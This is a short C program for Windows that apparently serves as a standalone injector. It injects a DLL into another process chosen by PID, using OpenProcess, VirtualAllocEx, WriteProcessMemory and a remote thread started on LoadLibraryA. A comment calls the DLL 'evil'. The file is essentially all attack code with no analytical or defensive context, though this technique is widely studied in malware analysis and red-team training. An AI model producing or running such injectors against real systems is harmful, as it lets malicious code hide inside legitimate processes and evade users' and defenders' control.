
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

char injectDLL[] = "C:\\Users\\DLLInjection.dll";
unsigned int dllLength = sizeof(injectDLL) + 1;

int main(int argc, char* argv[]) {


    // parse process ID
    if (atoi(argv[1]) == 0) {
        printf("PID not found :( exiting...\n");
        return -1;
    }
    printf("PID: %i", atoi(argv[1]));
    HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, FALSE, DWORD(atoi(argv[1])));
    if (hProcess == NULL) {
        printf("Error opening handle to the process, %u\n", GetLastError());
        return 1;
    }

    printf("Successfully Opened Handle to the Process\n");

    // allocate memory buffer for remote process
    LPVOID lpAlloc = VirtualAllocEx(hProcess, NULL, dllLength, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
    if (lpAlloc == NULL) {
        printf("Error Allocating memory to the process, %u\n", GetLastError());
        return 1;
    }
    printf("Successfully Allocated memory to the Process\n");

    // "copy" evil DLL between processes
    BOOL bWrite = WriteProcessMemory(hProcess, lpAlloc, injectDLL, dllLength, NULL);
    if (bWrite == NULL) {
        printf("Error writing DLL to the process, %u\n", GetLastError());
        return 1;
    }
    printf("Successfully copied DLL into the Process\n");

    // Load kernel32.dll in the current process
    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");

    // get the address of LoadLibraryA from kernel32.dll
    FARPROC loadLibAddress = GetProcAddress(hKernel32, "LoadLibraryA");
    PTHREAD_START_ROUTINE threadStartRoutineAddress = (PTHREAD_START_ROUTINE)loadLibAddress;

    // Start new thread on the process
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, threadStartRoutineAddress, lpAlloc, 0, NULL);
    if (hThread == NULL) {
        printf("Error executing DLL the process, %u\n", GetLastError());
        return 1;
    }
    printf("Successfully injected DLL into the Process\n");

    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}
